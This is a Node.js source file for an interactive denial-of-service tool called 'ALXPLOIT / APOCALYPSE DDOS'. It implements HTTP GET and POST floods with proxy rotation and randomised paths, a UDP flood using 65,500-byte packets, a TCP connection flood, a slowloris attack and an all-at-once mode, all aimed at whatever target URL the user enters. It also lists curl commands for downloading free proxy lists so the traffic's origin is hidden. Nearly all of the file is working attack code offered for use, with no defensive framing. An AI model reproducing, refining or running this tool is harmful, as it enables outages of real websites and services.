import net from 'net';
import http from 'http';
import https from 'https';
import dgram from 'dgram';
import fs from 'fs';
import readline from 'readline';
import crypto from 'crypto';
import { HttpsProxyAgent } from 'https-proxy-agent';

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const c = { 
    red: '\x1b[38;2;255;0;0m', darkRed: '\x1b[38;2;139;0;0m', green: '\x1b[38;2;0;255;0m', 
    yellow: '\x1b[38;2;255;255;0m', cyan: '\x1b[38;2;0;255;255m', magenta: '\x1b[38;2;255;0;255m',
    gray: '\x1b[38;2;128;128;128m', reset: '\x1b[0m', bold: '\x1b[1m', blink: '\x1b[5m' 
};

console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════════════════╗
║  █████╗ ██╗  ██╗ ██████╗ ██╗     ██████╗ ██╗████████╗    ██████╗ ██████╗  ██████╗ ███████╗║
║ ██╔══██╗╚██╗██╔╝██╔═══██╗██║     ╚════██╗██║╚══██╔══╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝║
║ ███████║ ╚███╔╝ ██║   ██║██║      █████╔╝██║   ██║       ██║  ██║██████╔╝██║   ██║███████╗║
║ ██╔══██║ ██╔██╗ ██║   ██║██║     ██╔═══╝ ██║   ██║       ██║  ██║██╔══██╗██║   ██║╚════██║║
║ ██║  ██║██╔╝ ██╗╚██████╔╝███████╗███████╗██║   ██║       ██████╔╝██║  ██║╚██████╔╝███████║║
║ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝║
${c.magenta}║                    ◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤ - ALXPLOIT                          ║
${c.red}${c.blink}║              🔥 APOCALYPSE DDOS - ALL MENU ACTIVE 🔥                    ║
${c.red}║                 💀 TOTAL ANNIHILATION | NO MERCY | NO ESCAPE 💀                   ║
${c.reset}${c.red}╚══════════════════════════════════════════════════════════════════════════════════════╝${c.reset}
`);

let proxies = [], active = false, stats = { total: 0, success: 0, failed: 0, packets: 0 }, bypass = 'auto', attackNum = 0;
let currentTarget = '', currentMethod = '', currentDuration = 0, useProxy = false;

const ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0','Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0','Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Chrome/120.0.0.0'];
const paths = ['/', '/wp-admin/admin-ajax.php', '/xmlrpc.php', '/index.php', '/login', '/api', '/.env', '/config.php'];

function loadProxies() {
    try { 
        proxies = fs.readFileSync('proxy.txt','utf-8').split('\n').filter(l=>l.trim()&&!l.startsWith('#'));
        console.log(`${c.green}✓${c.reset} ${c.cyan}Loaded ${c.yellow}${proxies.length}${c.cyan} death proxies${c.reset}\n`);
    } catch(e) { console.log(`${c.yellow}⚠ No proxies. Running without.${c.reset}\n`); }
}

function downloadProxiesManual() {
    console.log(`${c.cyan}
┌─────────────────────────────────────────────────────────────────────┐
│  📥 DOWNLOAD PROXY MANUAL                                          │
├─────────────────────────────────────────────────────────────────────┤
│  HTTPS Proxy (Support SSL):                                        │
│  curl -s https://raw.githubusercontent.com/proxifly/free-proxy-list/main/https.txt > proxy.txt
│                                                                     │
│  SOCKS5 Proxy (More Anonymous):                                    │
│  curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt | sed 's/socks5:\/\///g' > proxy.txt
│                                                                     │
│  MostStable Proxy (Long Lasting):                                  │
│  curl -s https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/MostStable/http.txt > proxy.txt
└─────────────────────────────────────────────────────────────────────┘
${c.reset}`);
}

function getProxy() { return proxies.length ? proxies[Math.floor(Math.random()*proxies.length)] : null; }

function getHeaders() {
    return { 
        'User-Agent': ua[Math.floor(Math.random()*ua.length)], 
        'Accept': '*/*', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive'
    };
}

function flood(target, duration, useProxyFlag, method='GET') {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    let localActive = true;
    
    const attack = () => {
        if(!localActive) return;
        const path = (bypass==='auto'?paths[Math.floor(Math.random()*paths.length)]:'/') + `?r=${crypto.randomBytes(8).toString('hex')}&t=${Date.now()}`;
        let options = { hostname: url.hostname, port: url.port||(isHttps?443:80), path, headers: getHeaders(), method, rejectUnauthorized: false };
        
        if(useProxyFlag && proxies.length) {
            const proxy = getProxy();
            if(proxy) options.agent = new HttpsProxyAgent(`http://${proxy}`);
        }
        
        const client = isHttps ? https : http;
        const req = client.request(options, res => { stats.total++; if(res.statusCode>=200&&res.statusCode<400) stats.success++; else stats.failed++; res.resume(); if(localActive) attack(); });
        req.on('error', () => { stats.total++; stats.failed++; if(localActive) attack(); });
        req.setTimeout(3000, () => req.destroy());
        req.end();
    };
    
    for(let i=0;i<800;i++) attack();
    setTimeout(() => localActive=false, duration*1000);
}

function udpFlood(target, duration) {
    const sock = dgram.createSocket('udp4'), msg = Buffer.from('X'.repeat(65500));
    let localActive = true;
    const send = () => { if(localActive) sock.send(msg,0,msg.length,80,target,()=>{ stats.packets++; if(localActive) send(); }); };
    for(let i=0;i<400;i++) send();
    setTimeout(() => localActive=false, duration*1000);
}

function tcpFlood(target, duration) {
    let localActive = true;
    const create = () => { if(!localActive) return; const sock = net.createConnection(80,target); sock.on('connect',()=>{ sock.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n\r\n`); stats.total++; setTimeout(()=>sock.destroy(),50); }); sock.on('error',()=>sock.destroy()); if(localActive) setTimeout(create,8); };
    for(let i=0;i<800;i++) create();
    setTimeout(() => localActive=false, duration*1000);
}

function slowloris(target, duration) {
    let localActive = true;
    const sockets = [];
    for(let i=0;i<1500;i++){ const sock = net.createConnection(80,target); sock.on('connect',()=>{ sock.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n`); const iv = setInterval(()=>{ if(!localActive){ clearInterval(iv); sock.destroy(); return; } sock.write(`X-Header: ${Math.random()}\r\n`); },10000); sockets.push({sock,iv}); stats.total++; }); sock.on('error',()=>sock.destroy()); }
    setTimeout(() => localActive=false, duration*1000);
}

function startAttack(target, method, duration, proxyFlag) {
    if(active){ console.log(`${c.red}⚠ Attack already running!${c.reset}\n`); return; }
    attackNum++; active=true; stats={total:0,success:0,failed:0,packets:0};
    console.log(`\n${c.red}${c.bold}╔════════════════════════════════════════════════════════════╗${c.reset}`);
    console.log(`${c.red}${c.bold}║              💀 APOCALYPSE ATTACK INITIATED 💀               ║${c.reset}`);
    console.log(`${c.red}${c.bold}╠════════════════════════════════════════════════════════════╣${c.reset}`);
    console.log(`${c.cyan}║  🎯 ${target.substring(0,55)}${c.reset}${' '.repeat(Math.max(0,60-target.length))}║`);
    console.log(`${c.cyan}║  ⚙️ ${method.toUpperCase()} | ⏱️ ${duration}s | 🔌 ${proxyFlag&&proxies.length?`YES(${proxies.length})`:'NO'}${c.reset}${' '.repeat(30)}║`);
    console.log(`${c.red}${c.bold}╚════════════════════════════════════════════════════════════╝${c.reset}\n`);
    const startTime = Date.now();
    
    if(method === 'http') flood(target, duration, proxyFlag, 'GET');
    else if(method === 'https') flood(target, duration, proxyFlag, 'GET');
    else if(method === 'post') flood(target, duration, proxyFlag, 'POST');
    else if(method === 'udp') udpFlood(target, duration);
    else if(method === 'tcp') tcpFlood(target, duration);
    else if(method === 'slow') slowloris(target, duration);
    else if(method === 'all') {
        flood(target, duration, proxyFlag, 'GET');
        flood(target, duration, proxyFlag, 'POST');
        udpFlood(target, duration);
        tcpFlood(target, duration);
        slowloris(target, duration);
    }
    
    const iv = setInterval(()=>{ const e=(Date.now()-startTime)/1000; console.log(`${c.red}[${e.toFixed(0)}s]${c.reset} 📊 REQ:${stats.total} | ✅ OK:${stats.success} | ❌ FAIL:${stats.failed} | ⚡ RPS:${Math.round(stats.total/e)}`); },1000);
    setTimeout(()=>{ active=false; clearInterval(iv); const e=(Date.now()-startTime)/1000; console.log(`\n${c.green}✅ APOCALYPSE COMPLETED${c.reset} | ${c.yellow}TOTAL:${stats.total} | OK:${stats.success} | FAIL:${stats.failed} | RPS:${Math.round(stats.total/e)}${c.reset}\n${c.magenta}💀 TARGET ${target} HAS BEEN CRUSHED 💀${c.reset}\n`); rl.prompt(); },duration*1000);
}

function showMenu() {
    console.log(`
${c.red}${c.bold}╔════════════════════════════════════════════════════════════════════════════════╗
║  ${c.yellow}💀 DARK MENU - APOCALYPSE EDITION ${c.red}                                              ║
╠════════════════════════════════════════════════════════════════════════════════╣
║  ${c.green}1. HTTP Flood        ${c.cyan}- Attack HTTP (port 80)                                 ║
║  ${c.green}2. HTTPS Flood       ${c.cyan}- Attack HTTPS (port 443) - WITH PROXY SUPPORT          ║
║  ${c.green}3. POST Flood        ${c.cyan}- HTTP POST flood                                      ║
║  ${c.green}4. UDP Flood         ${c.cyan}- High bandwidth UDP attack                           ║
║  ${c.green}5. TCP SYN Flood     ${c.cyan}- Raw TCP connection flood                            ║
║  ${c.green}6. Slowloris         ${c.cyan}- Slow headers attack                                 ║
║  ${c.green}7. ALL METHODS       ${c.red}- MAXIMUM DESTRUCTION                                   ║
║  ${c.green}8. Download Proxies  ${c.cyan}- Show proxy download commands                        ║
║  ${c.green}9. Stop Attack       ${c.cyan}- Stop current attack                                 ║
║  ${c.green}10. Exit             ${c.cyan}- Close tool                                          ║
╠════════════════════════════════════════════════════════════════════════════════╣
║  ${c.yellow}💀 QUICK COMMAND: attack <url> <method> <duration> <proxy>${c.red}                   ║
║  ${c.yellow}💀 EXAMPLE: attack https://target.com https 60 yes${c.red}                           ║
╚════════════════════════════════════════════════════════════════════════════════╝${c.reset}
`);
}

loadProxies();
console.log(`${c.cyan}💀 Type 'menu' for commands | ALL METHODS ACTIVE 💀${c.reset}\n`);
rl.setPrompt(`${c.red}🔥${c.reset} ${c.magenta}APOCALYPSE>${c.reset} `);
rl.prompt();

rl.on('line', async (input) => {
    const a = input.trim().split(' '), cmd = a[0].toLowerCase();
    
    if(cmd === 'attack' && a.length >= 4) {
        const target = a[1], method = a[2].toLowerCase(), duration = parseInt(a[3]), proxyFlag = a[4] === 'yes';
        if(isNaN(duration)) console.log(`${c.red}❌ Invalid duration${c.reset}\n`);
        else startAttack(target, method, duration, proxyFlag);
    }
    else if(cmd === '1') {
        rl.question(`${c.cyan}Enter target URL (http://...): ${c.reset}`, (target) => {
            rl.question(`${c.cyan}Enter duration (seconds): ${c.reset}`, (duration) => {
                rl.question(`${c.cyan}Use proxy? (yes/no): ${c.reset}`, (proxyFlag) => {
                    startAttack(target, 'http', parseInt(duration), proxyFlag === 'yes');
                });
            });
        });
    }
    else if(cmd === '2') {
        rl.question(`${c.cyan}Enter target URL (https://...): ${c.reset}`, (target) => {
            rl.question(`${c.cyan}Enter duration (seconds): ${c.reset}`, (duration) => {
                rl.question(`${c.cyan}Use proxy? (yes/no): ${c.reset}`, (proxyFlag) => {
                    startAttack(target, 'https', parseInt(duration), proxyFlag === 'yes');
                });
            });
        });
    }
    else if(cmd === '3') {
        rl.question(`${c.cyan}Enter target URL: ${c.reset}`, (target) => {
            rl.question(`${c.cyan}Enter duration (seconds): ${c.reset}`, (duration) => {
                rl.question(`${c.cyan}Use proxy? (yes/no): ${c.reset}`, (proxyFlag) => {
                    startAttack(target, 'post', parseInt(duration), proxyFlag === 'yes');
                });
            });
        });
    }
    else if(cmd === '4') {
        rl.question(`${c.cyan}Enter target IP/Domain: ${c.reset}`, (target) => {
            rl.question(`${c.cyan}Enter duration (seconds): ${c.reset}`, (duration) => {
                startAttack(target, 'udp', parseInt(duration), false);
            });
        });
    }
    else if(cmd === '5') {
        rl.question(`${c.cyan}Enter target IP/Domain: ${c.reset}`, (target) => {
            rl.question(`${c.cyan}Enter duration (seconds): ${c.reset}`, (duration) => {
                startAttack(target, 'tcp', parseInt(duration), false);
            });
        });
    }
    else if(cmd === '6') {
        rl.question(`${c.cyan}Enter target IP/Domain: ${c.reset}`, (target) => {
            rl.question(`${c.cyan}Enter duration (seconds): ${c.reset}`, (duration) => {
                startAttack(target, 'slow', parseInt(duration), false);
            });
        });
    }
    else if(cmd === '7') {
        rl.question(`${c.cyan}Enter target URL: ${c.reset}`, (target) => {
            rl.question(`${c.cyan}Enter duration (seconds): ${c.reset}`, (duration) => {
                rl.question(`${c.cyan}Use proxy? (yes/no): ${c.reset}`, (proxyFlag) => {
                    startAttack(target, 'all', parseInt(duration), proxyFlag === 'yes');
                });
            });
        });
    }
    else if(cmd === '8' || cmd === 'download-proxy') downloadProxiesManual();
    else if(cmd === '9' || cmd === 'stop') { active=false; console.log(`${c.red}🛑 Attack stopped${c.reset}\n`); }
    else if(cmd === '10' || cmd === 'exit') process.exit(0);
    else if(cmd === 'menu' || cmd === 'help') showMenu();
    else if(cmd !== '') console.log(`${c.red}❌ Unknown command! Type 'menu'${c.reset}\n`);
    
    rl.prompt();
});
